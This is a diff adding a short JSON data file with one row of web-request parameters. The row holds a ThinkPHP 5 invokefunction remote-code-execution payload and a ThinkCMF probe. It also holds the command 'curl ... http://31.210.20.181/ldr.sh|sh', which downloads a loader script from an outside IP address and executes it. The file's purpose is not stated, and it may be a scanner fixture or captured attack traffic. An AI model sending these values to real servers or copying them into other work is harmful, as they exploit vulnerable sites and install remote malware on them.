@@ -1,0 +1,23 @@
+{
+ "parameters": [
+  {
+   "name": "content",
+   "uuid": "9c644ace-d8bd-4836-b211-6d9c075ba7aa"
+  },
+  {
+   "name": "s",
+   "uuid": "f1be64b3-d26e-4919-8d3b-c09296a19ac2"
+  },
+  {
+   "name": "vars_0_",
+   "uuid": "37cd91ba-4dce-4112-a2b4-f659de43bd31"
+  }
+ ],
+ "rows": [
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "curl --user-agent curl_tp5 http://31.210.20.181/ldr.sh|sh"
+  }
+ ]
+}
